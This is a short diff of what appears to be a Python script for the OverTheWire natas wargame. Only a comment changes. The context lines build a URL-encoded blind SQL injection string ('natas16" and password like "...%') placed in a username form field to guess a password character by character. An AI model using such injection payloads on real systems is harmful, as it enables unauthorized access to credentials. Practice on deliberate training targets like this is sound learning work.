@@ -1,6 +1,6 @@
 import requests
 import string
- #test test test
+ #test2 test2 test2
 password = "w"
 inject = "natas16%22%20and%20password%20like%20%22"+password+"%"
 payload = {'temp':'y','username': inject}
